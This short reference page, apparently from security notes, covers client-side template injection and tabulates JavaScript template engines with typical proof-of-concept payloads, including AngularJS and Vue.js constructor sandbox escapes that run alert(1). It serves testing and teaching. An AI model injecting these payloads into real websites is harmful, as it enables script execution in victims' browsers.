---
description: Client-Side Template Injection (CSTI)
---

# CSTI Template Injection

🛠 Common engines vulnerable to CSTI

| Engine               | Language | Typical payload                                  |
| -------------------- | -------- | ------------------------------------------------ |
| **AngularJS (<1.6)** | JS       | `{{constructor.constructor('alert(1)')()}}`      |
| **Vue.js (<2.5)**    | JS       | `{{this.constructor.constructor('alert(1)')()}}` |
| **Mustache**         | JS       | Usually _not vulnerable_—logic-less engine       |
| **Handlebars**       | JS       | `{{#with "constructor"}}...`                     |
| **Ember.js**         | JS       | Prototype tricks                                 |
